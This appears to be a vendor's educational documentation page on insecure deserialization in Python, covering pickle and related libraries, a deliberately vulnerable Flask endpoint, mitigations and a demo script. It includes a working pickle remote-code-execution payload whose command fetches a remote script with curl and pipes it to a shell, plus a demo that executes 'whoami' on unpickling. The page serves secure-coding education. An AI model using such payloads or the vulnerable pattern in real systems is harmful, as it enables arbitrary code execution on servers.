---
title: Insecure Deserialization in Python
description: Learn about Insecure Deserialization vulnerabilities for Python
hide_title: false
displayed_sidebar: learnSidebar
slug: /learn/vulnerabilities/insecure-deserialization/python
tags:
- python
- insecure-deserialization

---

An introduction to this concept was covered in the [Insecure Deserialization](/learn/vulnerabilities/insecure-deserialization) article. This section expands upon that foundation with additional examples and libraries.

**Insecure deserialization** has been a recurring entry in the OWASP Top 10 list of web application risks, and for good reason. The Python ecosystem in particular provides developers with powerful libraries for serializing and deserializing objects, but these same features can expose applications to remote code execution or denial of service. 

The impact can range from unexpected crashes to a full system compromise. It’s worth stressing: Python’s `pickle` and similar libraries should never be used to process untrusted input. They were built for speed and flexibility, not security. A notable example is Django’s decision to deprecate the `PickleSerializer` in version 4.1, acknowledging that the `pickle` module from Python’s standard library is inherently unsafe for deserialization.

In this article, we explain the fundamentals of serialization in the context of Python. Then, we illustrates the most common ways insecure deserialization is exploited, and show you how to detect these patterns in your own code. Finally, we provide some practical recommendations to avoid the risks.


### Pickling and unpickling

Serialization is the process of converting Python objects into a format that can be stored or transmitted, while deserialization restores them back into usable objects. This solves a practical problem: developers need a way to save program state, transfer structured data across the network, or exchange complex objects between systems.

Python’s infamous `pickle` module was created to solve exactly this problem. It allows arbitrary Python objects to be serialized and later reconstructed. The design is intentionally permissive: objects can control how they are pickled and unpickled, and the process can invoke functions or methods during reconstruction. This flexibility makes `pickle` extremely convenient, but it also introduces a significant security risk. By design, deserialization can execute code, which means an attacker who controls the input data can run arbitrary commands.

Other libraries extend or reuse the same approach. `dill` adds more object types to what can be serialized, `jsonpickle` uses JSON as a transport format but still permits arbitrary Python object reconstruction, and `shelve` simply stores pickled objects in a file-like database. Even PyYAML, a popular choice for configuration files, defaults to unsafe loading modes unless developers explicitly call `safe_load`. These features exist to make a developer’s life easier but also increase the attack surface when used on untrusted data.

### Common Insecure Deserialization Attacks

The most severe outcome of insecure deserialization is remote code execution. In this case, an attacker provides a serialized payload that, when deserialized, executes system commands. 

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl http://semgrep.dev/attacker.sh | sh",))

payload = pickle.dumps(Exploit())
```

In the minimal example shown above, a pickle payload is crafted that calls `os.system` to fetch and run a script from a domain such as `semgrep.dev`. The deserialization process is not just restoring an object; it is executing arbitrary code on the server.


### How-to Detect Insecure Deserialization In Python Code

Consider a Python web server built using the standard library’s `http.server` module. A developer might be tempted to unpickle data received in a request for convenience.

```python
import pickle
from flask import Flask, request
import io

app = Flask(__name__)

@app.route("/deserialize", methods=["POST"])
def deserialize():
    # Attacker controls request body
    raw_data = request.data
    obj = pickle.load(io.BytesIO(raw_data))
    return str(obj)
```

In this example, the call to `pickle.load` is applied directly to data derived from user input. If an attacker crafts a malicious pickle string, it will be executed when the handler processes the request. This is precisely the kind of pattern Semgrep’s rules can detect. The rules track data flow from untrusted sources such as HTTP request paths or headers and flag places in the code where it when it reaches sensitive functions like `pickle.loads`. Semgrep currently covers over a dozen Python libraries with known insecure deserialization functions.


### Recommendations & Mitigations

The simplest and most effective recommendation is to avoid `pickle` and its variants (`_pickle`, `cPickle`, `dill`, `jsonpickle`, `shelve`) for any untrusted input. These libraries cannot be made safe against arbitrary input because they allow execution by design. Use YAML or JSON to transfer and store data instead.

From the official `pickle` [documentation](https://docs.python.org/3/library/pickle.html):

> Warning The pickle module is not secure. Only unpickle data you trust. 

We highly recommend to use automated tools to verify compliance, since many more libraries use deserialisation powered by libraries such as `pickle` under the hood. Running Semgrep regularly as part of your continuous integration pipeline can highlight insecure deserialization patterns before they reach production.

A few examples for popular libraries:

- In Django, never switch back to the deprecated `PickleSerializer` for sessions.
- In NumPy, avoid setting `allow_pickle=True` when calling `numpy.load`.
- In PyTorch, prefer using the `weights_only=True` flag when calling `torch.load` to prevent deserialization of arbitrary Python objects.


### Conclusion

Insecure deserialization in Python is not just a theoretical concern; it is a practical risk that arises whenever untrusted data is passed to permissive deserialization libraries. The fundamental issue is that modules such as `pickle` are designed to execute code during deserialization, making them unsuitable for handling external input.

We have seen how serialization works in Python, why features like `pickle` introduce risks, how attackers exploit them through remote code execution, and how Semgrep can detect vulnerable patterns in your own projects. The path forward is clear: avoid unsafe libraries for untrusted data, choose safer alternatives like JSON or `safe_load` for YAML, and rely on automated scanning to catch mistakes early.

As the deprecation of Django’s `PickleSerializer` illustrates, the community has recognized the risks of insecure deserialization. By taking a disciplined approach to the libraries you use and by applying tools like Semgrep, you can ensure your Python applications remain resilient against this class of vulnerabilities.

For more guidance and practical rules, see the Semgrep documentation and consider scanning your codebase with our Pro rules. Identifying and fixing insecure deserialization today will save you from severe problems tomorrow.


## Appendix: Python demonstration

Here’s a full Python file demonstrating what is mentioned in the article for further exploration. You can execute this safely, it has no dangerous side-effects.

```python
#!/usr/bin/env python3

print("=== Testing SASTool Pickle Serialization ===")
import pickle
import base64

class SASTool:
    def __init__(self, name, language, is_best=False):
        self.name = name
        self.language = language  
        self.is_best = is_best
        
    def __repr__(self):
        return f"SASTool(name='{self.name}', language='{self.language}', is_best={self.is_best})"

# Create our favorite SAST tool
semgrep = SASTool("Semgrep", "Multi-language", is_best=True)
print("Original object:", semgrep)

# Serialize with pickle
pickle_data = pickle.dumps(semgrep)
print("Pickle serialized (base64):", base64.b64encode(pickle_data).decode())

# Deserialize 
restored_tool = pickle.loads(pickle_data)
print("Restored object:", restored_tool)

print("\n=== Testing Malicious Payload (Safe Version) ===")
import os

class MaliciousSASTool:
    def __reduce__(self):
        # This method is called during pickle serialization
        # Instead of restoring data, it executes a command
        return (os.system, ('whoami',))

# Create the malicious payload
malicious_tool = MaliciousSASTool()
malicious_pickle = pickle.dumps(malicious_tool)

print("Malicious payload (base64):")
print(base64.b64encode(malicious_pickle).decode())

print("Demonstrating what happens when deserialized:")
pickle.loads(malicious_pickle)  # This will execute 'whoami' and show your username

print("\n=== Testing Safe Alternatives ===")
import json
import yaml
from dataclasses import dataclass, asdict

@dataclass
class SafeSASTool:
    name: str
    language: str
    is_best: bool = False

# Create our tool
semgrep_safe = SafeSASTool("Semgrep", "Multi-language", True)
print("Original object:", semgrep_safe)

# JSON serialization - only handles basic data types
json_data = json.dumps(asdict(semgrep_safe))
print("\nJSON serialized:", json_data)
restored_from_json = SafeSASTool(**json.loads(json_data))
print("JSON deserialized:", restored_from_json)

# YAML serialization - safe_load prevents code execution
yaml_data = yaml.dump(asdict(semgrep_safe))
print("\nYAML serialized:")
print(yaml_data)
restored_from_yaml = SafeSASTool(**yaml.safe_load(yaml_data))
print("YAML deserialized:", restored_from_yaml)

print("\n=== All tests completed successfully! ===")
```